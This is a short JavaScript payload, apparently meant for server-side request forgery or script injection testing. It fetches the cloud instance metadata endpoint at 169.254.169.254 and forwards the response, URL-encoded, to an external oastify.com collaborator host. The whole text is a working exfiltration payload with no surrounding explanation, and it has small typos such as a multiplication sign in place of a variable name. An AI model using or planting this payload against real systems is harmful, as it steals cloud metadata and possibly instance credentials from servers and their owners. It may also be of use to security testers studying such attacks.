× = new XMLHttpRequest;
x.onload = function() {
	l = new XMLHttpRequest;
	l.open("GET", "http://iawomokrdgbfavl2qsykge8licobc10q.oastify.com/" + encodeURIComponent( this.responseText));
	l.send();
};
x.open( "GET", "http://169.254.169.254/latest/meta-data");
x. send();